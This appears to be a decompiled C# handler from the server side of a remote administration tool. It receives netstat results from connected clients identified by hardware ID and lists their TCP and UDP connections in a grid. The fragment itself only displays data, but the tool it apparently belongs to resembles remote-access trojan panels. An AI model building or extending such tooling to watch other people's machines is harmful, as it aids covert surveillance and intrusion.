using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000065 RID: 101
	internal class HandlerNetstat
	{
		// Token: 0x06000201 RID: 513 RVA: 0x00020D88 File Offset: 0x0001EF88
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "ListTcp"))
					{
						if (!(a == "ListUdp"))
						{
							return;
						}
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormNetstat form = (FormNetstat)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.materialLabel1.Text = "Succues list Udp";
							int i = 2;
							while (i < objects.Length)
							{
								DataGridViewRow dataGridViewRow = new DataGridViewRow();
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (int)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = "UDP"
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = ""
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = ""
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								form.dataGridView2.Rows.Add(dataGridViewRow);
							}
						}));
						return;
					}
					else
					{
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormNetstat form = (FormNetstat)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.dataGridView2.Rows.Clear();
							form.materialLabel1.Text = "Succues list Tcp";
							int i = 2;
							while (i < objects.Length)
							{
								DataGridViewRow dataGridViewRow = new DataGridViewRow();
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (int)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = "TCP"
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								form.dataGridView2.Rows.Add(dataGridViewRow);
							}
						}));
						return;
					}
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormNetstat form = (FormNetstat)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Error: " + (string)objects[2];
					}));
					return;
				}
			}
			else
			{
				FormNetstat form = (FormNetstat)Application.OpenForms["Netstat:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Netstat [" + (string)objects[2] + "]";
					form.client = client;
					form.materialLabel1.Enabled = true;
					form.dataGridView2.Enabled = true;
					form.materialLabel1.Text = "Succues Connect";
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
